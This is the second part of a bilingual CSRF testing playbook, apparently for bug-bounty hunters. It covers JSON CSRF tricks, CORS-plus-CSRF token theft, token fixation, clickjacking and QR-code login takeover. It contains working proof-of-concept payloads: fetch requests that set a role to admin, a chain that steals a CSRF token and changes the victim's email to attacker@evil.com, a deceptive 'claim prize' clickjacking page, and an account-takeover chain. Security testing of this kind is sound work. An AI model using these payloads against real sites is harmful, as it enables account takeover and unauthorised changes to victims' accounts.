# csrf-test · part 2

> 分段 2/2。完整索引见 `csrf-test.md`。

## 14. ADVANCED JSON CSRF TECHNIQUES

### 14.1 Flash-based Content-Type manipulation (legacy)

Flash (pre-2021) could send arbitrary `Content-Type` headers cross-origin without preflight:

```actionscript
var req:URLRequest = new URLRequest("https://target.com/api/role");
req.method = "POST";
req.contentType = "application/json";
req.data = '{"role":"admin"}';
navigateToURL(req);
```

Legacy but still relevant for older internal applications.

### 14.2 fetch() no-cors mode limitations and workarounds

`fetch()` in `no-cors` mode can send simple requests but cannot set `Content-Type: application/json` (triggers preflight) or read the response.

Workaround — if the server accepts `text/plain` body and parses it as JSON:

```javascript
fetch('https://target.com/api/role', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"role":"admin"}'
});
```

### 14.3 Encoding JSON as form-urlencoded

Some backends accept both content types:

```html
<form action="https://target.com/api/role" method="POST">
  <input name="role" value="admin">
  <input name="user_id" value="123">
</form>
```

If the server processes `role=admin&user_id=123` the same as `{"role":"admin","user_id":123}` → CSRF via plain HTML form without CORS preflight.

---
## 15. CSRF + CORS MISCONFIGURATION CHAINS

> **SRC：** 本节只帮助理解「读 token → 再 CSRF 写」。  
> 主洞写 **CSRF / 越权写**；**不要**另交 CORS 报告。

### Reflected Origin + Credentials

```text
1. Target API reflects Origin in Access-Control-Allow-Origin
2. Access-Control-Allow-Credentials: true
3. Attacker page sends credentialed fetch() from https://evil.com
4. Response is readable → CSRF token extracted from response
5. Second request with valid CSRF token → bypass all CSRF defenses
```

```javascript
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
      fetch('https://target.com/api/change-email', {
          method: 'POST',
          credentials: 'include',
          headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': data.csrf_token
          },
          body: JSON.stringify({email: 'attacker@evil.com'})
      });
  });
```

### Subdomain XSS → CORS → CSRF

If `*.target.com` is in the CORS allowlist and an XSS exists on any subdomain:
1. Exploit XSS on `blog.target.com`
2. From XSS context, fetch API at `api.target.com` (CORS allows subdomain)
3. Read CSRF token from response
4. Submit state-changing request with valid token

---
## 16. CSRF TOKEN FIXATION (PRE-SESSION TOKENS)

If CSRF tokens are issued before authentication and remain valid after login:

```text
1. Attacker visits target.com → receives CSRF token T1
2. Attacker forces victim's browser to use T1:
   a. Cookie tossing from subdomain
   b. CRLF injection to set csrf_cookie
3. Victim logs in — CSRF token unchanged
4. Attacker submits CSRF request with known T1 → succeeds
```

### Test procedure

```text
□ Obtain CSRF token as unauthenticated user
□ Log in — does the CSRF token change?
□ If unchanged → token fixation: pre-auth token works post-auth
□ Use pre-auth token in a CSRF PoC against authenticated endpoint
```

---
## 17. CLICKJACKING AS CSRF BYPASS

When CSRF protections are solid but `X-Frame-Options` / `frame-ancestors` is missing:

### Attack flow

```text
1. Target page is frameable (no X-Frame-Options / CSP frame-ancestors)
2. Attacker creates transparent iframe overlay
3. Victim sees attacker content, clicks land on target's action button in hidden iframe
4. Click originates from same origin (within iframe) — bypasses CSRF tokens
```

### PoC template

```html
<html>
<body>
<div style="position:relative">
  <iframe src="https://target.com/account/settings"
    style="opacity:0.0001; position:absolute; top:0; left:0;
           width:500px; height:500px; z-index:2;">
  </iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;
                 padding:20px; font-size:24px;">
    Click to claim prize!
  </button>
</div>
</body>
</html>
```

### Defense check

```text
□ X-Frame-Options: DENY or SAMEORIGIN header present?
□ CSP: frame-ancestors 'self' or frame-ancestors 'none'?
□ If neither → clickjacking possible → CSRF bypass via iframe
```

---
## 18. 扫码登录 CSRF → 用户接管（战法索引有指针）

> 本质：已登录用户被骗打开一条 URL，Cookie 自己带过去，等于帮攻击者点了「确认扫码」。  
> 和改密/转账 CSRF 同类，打在「确认扫码」这一下。战法索引一行指向本节。  
> 进库的是手法，不是某个站的 token 实值。

### 18.1 认什么（开场就能认）

同时出现就当开场几枪：

- 登录页有二维码 / 「用 App 扫码」
- 不登录调生成接口，回包里有 `token`（或 ticket / scene / sid），常带过期时间
- 同一站还有登录 URL 吃 query：`/login?token=`、`?ticket=`、`agentType=` 之类

### 18.2 链怎么穿（两边浏览器）

```
攻击者（无痕、未登录）
  → 打开扫码登录
  → 抓住生成 token 的请求/响应（常见 path 含 qrcode / qr / gen_login_token / is_token_login）
  → 把 token 塞进登录页 URL

受害者（已登录同一站点）
  → 打开这条 URL（顶栏跳转即可，和 SameSite=Lax 顶栏 GET 对得上）
  → 服务端把该 token 绑到他的号上（等于扫码确认）

攻击者无痕
  → 轮询/刷新后变成受害者的号
```

构造形态（字段名按现场改，不要死抄）：

```
https://目标登录页?token=刚才拿到的token
https://目标登录页?agentType=数字&token=...&lang=...
```

### 18.3 出什么算成

攻击者**未登录**的那一端出现对方头像/账号，能当对方用。  
只证明「已登录的人打开了链接」不算；必须无痕那边登录态过来。

### 18.4 假点（形态不是洞，不是「这站没打穿」）

- token 过期后再点，两边都没登录
- 点开只重新出一张码，不把 token 绑到当前已登录号
- 必须手机 App 真扫，URL 打开不算确认

这站 401 / token 换了一串没中 → 只说明这站不行，**下一站同类照样打**，不删战法索引这行。

### 18.5 和邻近手法别混

| 本条 | 别当成 |
|------|--------|
| 确认扫码这一下的 CSRF | 不登录直接读业务接口 |
| 受害者要已登录（要会话） | 无密码登录绕过、空密进后台 |
| GET 登录 URL 就能确认 | 必须 POST + 自定义头才改状态的 CSRF（那种还要另测） |

OAuth 缺 `state` 把 code 丢给受害者（§9）是近亲：都是「已登录的人打开攻击者准备好的回调」。扫码这条认的是 **QR token**，不是 authorization code。

### 18.6 开场探针（有入口就打，半分钟级）

1. 不登录打开扫码登录，抓生成 token 的接口  
2. 看响应有没有 token / 过期字段；看前端会不会拼 `/login?token=`  
3. 自己已登录的另一个配置打开拼好的 URL  
4. 回未登录端看是否变成自己的号  

第 4 步成立 → 按 `src-value` 写接管报告。密钥/token 实值只写报告，不写进战法索引。

### 18.7 社交 App 内置浏览器（见了再打）

页是在社交 App WebView 里打开、且会按域自动带 `pskey` / 静默 OAuth 时：同域 XSS 可以顺手把凭证带出去，或替已登录用户点确认扫码。**不是每站必打**；没有这层壳，仍只打上面的扫码 CSRF。不进战法索引。
